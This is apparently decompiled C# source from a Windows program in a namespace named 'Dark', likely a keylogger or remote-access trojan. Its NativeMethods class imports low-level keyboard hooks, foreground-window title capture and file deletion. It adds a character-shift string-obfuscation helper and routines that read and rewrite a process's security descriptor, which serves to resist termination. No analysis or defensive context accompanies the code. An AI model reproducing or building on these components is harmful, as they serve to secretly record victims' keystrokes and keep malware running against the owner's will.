using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Dark;

public class NativeMethods : NativeWindow
{
	public static string log = "" + Environment.NewLine;

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool DeleteFileA([MarshalAs(UnmanagedType.VBByRefStr)] ref string path);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

	[DllImport("user32.dll")]
	public static extern IntPtr SetWindowsHookEx(int Hk, KeyBoardHook.keyboardHookProc Cb, IntPtr Hin, uint Thr);

	[DllImport("user32.dll")]
	public static extern bool UnhookWindowsHookEx(IntPtr hInstance);

	[DllImport("user32.dll")]
	public static extern int CallNextHookEx(IntPtr Hk, int NCde, int WP, ref KeyBoardHook.keyboardHookStruct LP);

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string FNme);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(IntPtr H, int P, ref int R, int T);

	public static string RotateRight(string @string)
	{
		string text = string.Empty;
		int num = @string.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			text += Conversions.ToString(Strings.Chr(Strings.Asc(@string[i]) + 5));
		}
		return text;
	}

	public static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] target = default(byte[]);
		uint lpnLengthNeeded = default(uint);
		RawSecurityDescriptor rawSecurityDescriptor = default(RawSecurityDescriptor);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 189:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 5:
							goto IL_0030;
						case 6:
						case 7:
							goto IL_0039;
						case 8:
							goto IL_0063;
						case 9:
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0063:
					num = 8;
					throw new Win32Exception();
					IL_0007:
					num = 2;
					target = new byte[0];
					goto IL_0011;
					IL_0011:
					num = 3;
					GetKernelObjectSecurity(processHandle, 4, target, 0u, ref lpnLengthNeeded);
					goto IL_0020;
					IL_0020:
					num = 4;
					if ((ulong)lpnLengthNeeded > 32767uL)
					{
						goto IL_0030;
					}
					goto IL_0039;
					IL_0030:
					num = 5;
					throw new Win32Exception();
					IL_0039:
					num = 7;
					if (GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper(ref target, new byte[(uint)(UIntPtr)lpnLengthNeeded - 1 + 1]), lpnLengthNeeded, ref lpnLengthNeeded))
					{
						break;
					}
					goto IL_0063;
					end_IL_0000_2:
					break;
				}
				num = 10;
				rawSecurityDescriptor = new RawSecurityDescriptor(target, 0);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 189;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		RawSecurityDescriptor result = rawSecurityDescriptor;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static T InlineAssignHelper<T>(ref T target, T value)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		T val = default(T);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 56:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					target = value;
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				val = value;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 56;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		T result = val;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] array = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 88:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0019;
						case 4:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0019:
					num = 3;
					dacl.GetBinaryForm(array, 0);
					break;
					IL_0007:
					num = 2;
					array = new byte[dacl.BinaryLength - 1 + 1];
					goto IL_0019;
					end_IL_0000_2:
					break;
				}
				num = 4;
				SetKernelObjectSecurity(processHandle, 4, array);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 88;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
